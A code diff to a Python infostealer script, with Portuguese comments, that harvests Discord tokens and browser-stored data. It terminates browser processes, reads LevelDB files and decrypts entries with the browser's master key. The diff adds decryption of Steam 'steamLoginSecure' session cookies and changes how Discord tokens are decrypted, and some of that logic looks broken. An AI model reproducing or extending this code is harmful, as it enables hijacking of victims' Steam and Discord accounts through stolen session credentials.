@@ -87,6 +87,18 @@ def decrypt_token(buff, master_key):
     except:
         return None
 
+# Função para descriptografar cookies da Steam
+def decrypt_cookie(encrypted_cookie, master_key):
+    try:
+        init_vector = encrypted_cookie[3:15]
+        enc_pass = encrypted_cookie[15:-16]
+        cipher = AES.new(master_key, AES.MODE_GCM, init_vector)
+        decrypted_cookie = cipher.decrypt(enc_pass).decode()
+        return decrypted_cookie
+    except Exception as e:
+        print(f"Erro ao descriptografar o cookie: {e}")
+        return None
+
 # Função para encerrar processos do navegador para evitar erros de permissão
 def close_browser_process(browser_name):
     for proc in psutil.process_iter(['pid', 'name']):
@@ -123,30 +135,37 @@ def get_tokens(path):
                         with open(os.path.join(lev_db, file_name), "r", errors='ignore') as files:
                             for line in files.readlines():
                                 line = line.strip()
-                                # Captura tokens de diferentes formatos
+
+                                # Captura o cookie steamLoginSecure
+                                if 'steamLoginSecure' in line:
+                                    try:
+                                        # Descriptografa o cookie de sessão da Steam
+                                        decrypted_cookie = decrypt_cookie(b64decode(line), master_key)
+                                        if decrypted_cookie:
+                                            tokens.add(decrypted_cookie)
+                                            print(f"Cookie steamLoginSecure descriptografado: {decrypted_cookie}")
+                                        else:
+                                            print("Falha ao descriptografar steamLoginSecure.")
+                                    except Exception as e:
+                                        print(f"Erro ao tentar descriptografar o cookie steamLoginSecure: {e}")
+                                        continue
+
+                                # Captura tokens de diferentes formatos (incluindo Discord)
                                 token_match = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}', line)
                                 mfa_match = re.findall(r'mfa\.[\w-]{84}', line)
 
-                                # Processa tokens padrão e tokens com estrutura MFA
                                 for token in token_match + mfa_match:
                                     try:
-                                        if 'dQw4w9WgXcQ:' in token:
-                                            # Tenta descriptografar tokens com prefixo específico
-                                            decrypted = decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
-                                        else:
-                                            # Se não houver prefixo, tenta descriptografar o token completo
-                                            decrypted = decrypt_token(b64decode(token), master_key)
-
+                                        decrypted = decrypt_token(b64decode(token), master_key)
                                         if decrypted:
                                             tokens.add(decrypted)
                                             print(f"Token descriptografado: {decrypted}")
                                         else:
-                                            # Se não descriptografar, mas o token ainda for válido, adicione-o diretamente
                                             tokens.add(token)
-                                            print(f"Token sem descriptografia adicionado: {token}")
+                                            print(f"Token adicionado sem descriptografia: {token}")
                                     except Exception as e:
-                                        print(f"Erro ao tentar descriptografar o token: {e}")
-                                        tokens.add(token)  # Adiciona token mesmo em caso de erro na descriptografia
+                                        print(f"Erro ao descriptografar token: {e}")
+                                        tokens.add(token)
                                         continue
 
                     except PermissionError as e:
